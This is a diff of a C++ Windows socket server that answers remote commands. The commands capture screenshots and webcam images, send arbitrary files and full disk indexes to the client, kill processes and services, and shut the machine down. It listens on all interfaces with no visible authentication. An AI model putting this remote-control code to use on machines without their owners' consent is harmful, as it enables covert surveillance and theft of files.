@@ -22,9 +22,11 @@ bool Server::setupSocket() {
 }
 
 bool Server::assignPort() {
+    const int DEFAULT_PORT = 42069;
+
     server_address.sin_family = AF_INET;
     server_address.sin_addr.s_addr = INADDR_ANY;
-    server_address.sin_port = 0;
+    server_address.sin_port = htons(DEFAULT_PORT);
 
     if (bind(server_socket, reinterpret_cast<sockaddr *>(&server_address), sizeof(server_address)) == SOCKET_ERROR) {
         std::cerr << "Bind failed" << std::endl;
@@ -131,7 +133,7 @@ void Server::toggleWebcam() {
     }
 }
 
-void Server::shutdown(const char *buffer) {
+void Server::Shutdown(const char *buffer) {
     char *endPtr;
     const UINT nSDType = strtol(buffer + 9, &endPtr, 10);
 
@@ -174,10 +176,10 @@ void Server::capture(vector<char> &image) {
     wss << L"Capture completed.\n";
 }
 
-void Server::openAndSendFile(string file_path)
-{
-        openFile(file_path);
-}
+// void Server::openAndSendFile(string file_path)
+// {
+//     openFile(file_path);
+// }
 
 
 int Server::sendSizeAndResponse(const SOCKET &client_socket) const {
@@ -216,37 +218,33 @@ void Server::handleClient(const SOCKET client_socket) {
         else if (strcmp(buffer, "!list s") == 0)
             listServices();
 
-        else if (strcmp(buffer, "!screenshot") == 0)
+        else if (strcmp(buffer, "!screenshot") == 0) {
             screenShot(image);
-
-        else if (strcmp(buffer, "!webcam") == 0)
+            SendImage(image, client_socket);
+        } else if (strcmp(buffer, "!webcam") == 0)
             toggleWebcam();
 
         else if (strcmp(buffer, "!shutdown ") == 0)
-            shutdown(buffer);
+            Shutdown(buffer);
 
         else if (strstr(buffer, "!endp ") != nullptr)
             endProcess(buffer);
 
-        else if (strstr(buffer, "!ends ") == buffer)
+        else if (strstr(buffer, "!ends ") != nullptr)
             endService(buffer);
 
-        else if (strcmp(buffer, "!capture") == 0)
+        else if (strcmp(buffer, "!capture") == 0) {
             capture(image);
-
-        else if (strcmp(buffer, "!list disks") == 0)
-            showAvailableDisks();
+            SendImage(image, client_socket);
+        } else if (strcmp(buffer, "!list disks") == 0)
+            ShowAvailableDisks();
 
         else if (strstr(buffer, "!index") != NULL)
-            indexSystem(string(buffer + 7));
+            IndexSystem(string(buffer + 7), client_socket);
 
-        else if (strstr(buffer, "!get file ") != NULL)
-            getFile(string(buffer + 10));
-
-        else if (strstr(buffer, "!open ") != NULL)
-            openAndSendFile(string(buffer + 6));
-
-        else if (strcmp(buffer, "!exit") == 0)
+        else if (strstr(buffer, "!get file") != NULL) {
+            GetAndSendFile(string(buffer + 10), client_socket);
+        } else if (strcmp(buffer, "!exit") == 0)
             break;
 
         else
@@ -257,33 +255,43 @@ void Server::handleClient(const SOCKET client_socket) {
         if (!sent_bytes)
             std::cerr << "Failed to send size." << std::endl;
 
-        if (strcmp(buffer, "!screenshot") == 0 || strcmp(buffer, "!capture") == 0) {
-            int image_size = static_cast<int>(image.size());
-            send(client_socket, reinterpret_cast<char *>(&image_size), sizeof(int), 0);
-
-            if (!image.empty())
-                send(client_socket, image.data(), static_cast<int>(image.size()), 0);
-
-            if (sent_bytes == SOCKET_ERROR) {
-                std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
-                break;
-            }
-            std::cout << "Sent image data of size: " << image_size << " bytes" << std::endl;
-        } else if (strstr(buffer, "!get file")) {
-            int file_size = static_cast<int>(fileData.  size());
-            send(client_socket, reinterpret_cast<char *>(&file_size), sizeof(int), 0);
-
-            if (!fileData.empty())
-                send(client_socket, fileData.data(), static_cast<int>(fileData.size()), 0);
-
-            if (sent_bytes == SOCKET_ERROR) {
-                std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
-                break;
-            }
-            std::cout << "Sent file of size: " << file_size << " bytes" << std::endl;
-        }
+        // if (strcmp(buffer, "!screenshot") == 0 || strcmp(buffer, "!capture") == 0) {
+        //     int image_size = static_cast<int>(image.size());
+        //     send(client_socket, reinterpret_cast<char *>(&image_size), sizeof(int), 0);
+        //
+        //     if (!image.empty())
+        //         send(client_socket, image.data(), static_cast<int>(image.size()), 0);
+        //
+        //     // if (sent_bytes == SOCKET_ERROR) {
+        //     //     std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
+        //     //     break;
+        //     // }
+        //     std::cout << "Sent image data of size: " << image_size << " bytes" << std::endl;
+        // } else if (strstr(buffer, "!get file")) {
+        //     int file_size = static_cast<int>(fileData.size());
+        //     send(client_socket, reinterpret_cast<char *>(&file_size), sizeof(int), 0);
+        //
+        //     if (!fileData.empty())
+        //         send(client_socket, fileData.data(), static_cast<int>(fileData.size()), 0);
+        //
+        //     // if (sent_bytes == SOCKET_ERROR) {
+        //     //     std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
+        //     //     break;
+        //     // }
+        //     std::cout << "Sent file of size: " << file_size << " bytes" << std::endl;
+        // }
     }
     closesocket(client_socket);
+}
+
+void Server::SendImage(vector<char> &image, const SOCKET client_socket) {
+    int image_size = static_cast<int>(image.size());
+    send(client_socket, reinterpret_cast<char *>(&image_size), sizeof(int), 0);
+
+    if (!image.empty())
+        send(client_socket, image.data(), static_cast<int>(image.size()), 0);
+
+    std::cout << "Sent image data of size: " << image_size << " bytes" << std::endl;
 }
 
 void Server::startServer() {
@@ -302,31 +310,73 @@ void Server::startServer() {
 
     while (true) {
         DiscoveryResponder responder;
-        responder.listen();
 
-        while (true) {
-            const SOCKET client_socket = accept(server_socket, nullptr, nullptr);
-            if (client_socket == INVALID_SOCKET) {
-                cerr << "Accept failed" << endl;
-                continue;
+        // Set up timeout for responder.listen()
+        fd_set readfds;
+        struct timeval listen_timeout;
+        listen_timeout.tv_sec = LISTEN_TIMEOUT_SECONDS;
+        listen_timeout.tv_usec = 0;
+
+        // Start listening
+        try {
+            responder.listen();
+
+            while (true) {
+                // Set up file descriptor set and timeout for accept
+                FD_ZERO(&readfds);
+                FD_SET(server_socket, &readfds);
+
+                struct timeval connection_timeout;
+                connection_timeout.tv_sec = CONNECTION_TIMEOUT_SECONDS;
+                connection_timeout.tv_usec = 0;
+
+                // Wait for connection with timeout
+                int activity = select(server_socket + 1, &readfds, NULL, NULL, &connection_timeout);
+
+                if (activity == 0) {
+                    // Timeout occurred
+                    cout << "Connection timeout, restarting listener..." << endl;
+                    break; // Break inner loop to restart responder
+                } else if (activity < 0) {
+                    cerr << "Select error" << endl;
+                    break;
+                }
+
+                // If we get here, we have a pending connection
+                const SOCKET client_socket = accept(server_socket, nullptr, nullptr);
+                if (client_socket == INVALID_SOCKET) {
+                    cerr << "Accept failed" << endl;
+                    continue;
+                }
+
+                cout << "New client connected." << endl;
+                handleClient(client_socket);
+                break;
             }
-            cout << "New client connected." << endl;
-            handleClient(client_socket);
-            break;
+        } catch (const std::exception &e) {
+            cerr << "Listener error: " << e.what() << endl;
         }
+
+        // Wait before restarting the responder
+        std::this_thread::sleep_for(std::chrono::seconds(1));
     }
 }
 
-void Server::showAvailableDisks() {
+void Server::ShowAvailableDisks() {
     wss << L"Available Disks: " << std::endl;
 
     for (const auto &disk: getWinDir.listDisks())
         wss << disk.c_str() << std::endl;
 }
 
-void Server::indexSystem(string drive = "") {
+void Server::IndexSystem(string drive, const SOCKET clientSocket) {
     if (drive.empty()) {
         wss << "Scanned disks: " << std::endl;
+
+        // Send numbers of disks
+        int file_size = static_cast<int>(getWinDir.disks.size());
+        send(clientSocket, reinterpret_cast<char *>(&file_size), sizeof(int), 0);
+
         for (const auto &disk: getWinDir.disks) {
             std::string fileName = "cache_" + std::string(1, disk[0]) + ".txt";
             std::ofstream file(fileName);
@@ -340,6 +390,11 @@ void Server::indexSystem(string drive = "") {
             GetWinDirectory::fullScan(disk, file);
 
             file.close();
+
+            // Send disk ID
+            send(clientSocket, disk.c_str(), static_cast<int>(disk.size()), 0);
+
+            GetAndSendFile(fileName, clientSocket);
             std::cout << "Full scan of " << disk << " has been written to " << fileName << std::endl;
         }
     } else {
@@ -355,11 +410,13 @@ void Server::indexSystem(string drive = "") {
         GetWinDirectory::fullScan(drive, file);
 
         file.close();
+        GetAndSendFile(fileName, clientSocket);
         std::cout << "Full scan of " << drive << " has been written to " << fileName << std::endl;
     }
 }
 
-void Server::getFile(string filePath) {
+void Server::GetAndSendFile(string filePath, const SOCKET client_socket) {
+    std::vector<char> fileData;
     try {
         std::ifstream file(filePath, std::ios::binary);
         if (!file) {
@@ -384,4 +441,12 @@ void Server::getFile(string filePath) {
         fileData = std::vector<char>();
         wss << L"Error reading file: " << e.what() << std::endl;
     }
+
+    int file_size = static_cast<int>(fileData.size());
+    send(client_socket, reinterpret_cast<char *>(&file_size), sizeof(int), 0);
+
+    if (!fileData.empty())
+        send(client_socket, fileData.data(), static_cast<int>(fileData.size()), 0);
+
+    std::cout << "Sent file of size: " << file_size << " bytes" << std::endl;
 };
